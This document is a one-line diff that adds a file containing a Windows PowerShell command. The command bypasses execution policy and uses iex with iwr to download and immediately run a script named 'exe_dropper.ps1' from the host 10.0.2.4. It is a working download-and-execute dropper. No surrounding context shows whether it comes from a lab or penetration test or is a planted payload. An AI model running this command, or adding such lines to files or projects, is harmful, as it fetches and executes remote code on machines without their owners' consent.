@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -c "iex (iwr -UseBasicParsing http://10.0.2.4/exe_dropper.ps1)"; Exit
